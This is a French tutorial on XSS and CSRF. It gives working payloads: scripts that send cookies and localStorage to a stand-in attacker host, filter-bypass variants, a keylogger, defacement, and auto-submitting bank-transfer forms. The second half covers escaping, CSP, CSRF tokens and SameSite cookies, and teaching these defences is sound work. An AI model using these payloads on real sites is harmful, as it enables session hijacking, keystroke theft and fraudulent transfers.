# XSS et CSRF : les attaques web les plus courantes

Le Cross-Site Scripting (XSS) et le Cross-Site Request Forgery (CSRF) figurent systématiquement dans l'OWASP Top 10. Ensemble, ils représentent des dizaines de milliers de vulnérabilités dans des applications web réelles.

## XSS — Cross-Site Scripting

### Types de XSS

**XSS Réfléchi (Reflected) :**
```html
<!-- URL malveillante envoyée à la victime -->
https://site.com/search?q=<script>document.location='http://attaquant.com/steal?c='+document.cookie</script>

<!-- Le serveur vulnérable inclut directement l'input dans la page -->
<p>Résultats pour : <script>document.location='...'</script></p>
```

**XSS Stocké (Stored) :**
```html
<!-- Commentaire posté sur un forum vulnérable -->
Votre commentaire : <script>
  // Ce script s'exécute pour CHAQUE visiteur qui voit le commentaire !
  fetch('https://attaquant.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: window.location.href,
      localStorage: JSON.stringify(localStorage)
    })
  });
</script>
```

**XSS DOM-based :**
```javascript
// Code JavaScript vulnérable
var userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;
// Si #<img src=x onerror=alert(1)> → XSS !
```

### Payloads XSS courants

```javascript
// Test basique
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Contournement de filtres
<sCriPt>alert('XSS')</sCriPt>              // Bypass casse
<script>alert(String.fromCharCode(88,83,83))</script>  // Encodage
javascript:alert('XSS')                    // Dans href
" onmouseover="alert('XSS')               // Dans attribut

// Vol de cookies
<script>new Image().src='http://attaquant.com/?c='+document.cookie</script>

// Keylogger
<script>
document.addEventListener('keypress', function(e) {
  fetch('http://attaquant.com/log?k=' + e.key);
});
</script>

// Defacement
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
```

### Protection contre XSS

```python
# Python/Flask - Échappement automatique avec Jinja2
from flask import render_template
from markupsafe import escape

# ✅ Jinja2 échappe automatiquement
return render_template('page.html', user_input=user_input)
# Dans le template : {{ user_input }} → automatiquement échappé

# ✅ Sanitisation avec bleach
import bleach
ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong']
safe_html = bleach.clean(user_html, tags=ALLOWED_TAGS, strip=True)
```

```javascript
// JavaScript - Éviter innerHTML, utiliser textContent
// ❌ Vulnérable
element.innerHTML = userInput;

// ✅ Sécurisé
element.textContent = userInput;

// Content Security Policy (CSP) - La protection la plus efficace
// Header HTTP :
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; img-src 'self' data:

// Avec nonce dans le HTML :
<script nonce="random123">/* Code légitime */</script>
// Les scripts sans nonce correct sont bloqués même si injectés par XSS
```

## CSRF — Cross-Site Request Forgery

### Comment ça fonctionne

```html
<!-- Scénario : utilisateur connecté à sa banque (banque.fr) -->
<!-- Visite un site malveillant qui contient : -->

<!-- CSRF via image invisible -->
<img src="https://banque.fr/virement?montant=1000&vers=attaquant" width="0" height="0">

<!-- CSRF via formulaire auto-soumis -->
<form id="csrf" action="https://banque.fr/virement" method="POST">
  <input type="hidden" name="montant" value="1000">
  <input type="hidden" name="vers" value="attaquant">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Le navigateur envoie automatiquement les cookies de session banque.fr
     → La banque croit que c'est l'utilisateur qui fait le virement ! -->
```

### Protection contre CSRF

```python
# Token CSRF - La protection standard
from flask_wtf.csrf import CSRFProtect
from secrets import token_hex

# Génération du token
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = token_hex(32)
    return session['csrf_token']

# Vérification
def validate_csrf_token(token):
    return token == session.get('csrf_token')

# Dans le formulaire HTML
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

```javascript
// SameSite Cookie Attribute - Protection moderne
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// SameSite=Strict : cookie jamais envoyé dans les requêtes cross-site
// SameSite=Lax    : cookie envoyé seulement pour navigation top-level (GET)
// SameSite=None   : ancien comportement (requiert Secure)

// Double Submit Cookie Pattern
const csrfToken = generateRandomToken();
document.cookie = `csrf=${csrfToken}; SameSite=Strict`;

fetch('/api/action', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': csrfToken  // Doit matcher le cookie
    }
});
```

## Conclusion

XSS et CSRF sont évitables à 100% avec les bonnes pratiques : **échappement systématique des sorties, CSP stricte pour XSS, tokens CSRF + SameSite cookies pour CSRF**. Ces protections doivent être activées par défaut dans tout nouveau projet.

---
*Article suivant : [HTTPS et certificats SSL/TLS](../articles/https-ssl-tls)*
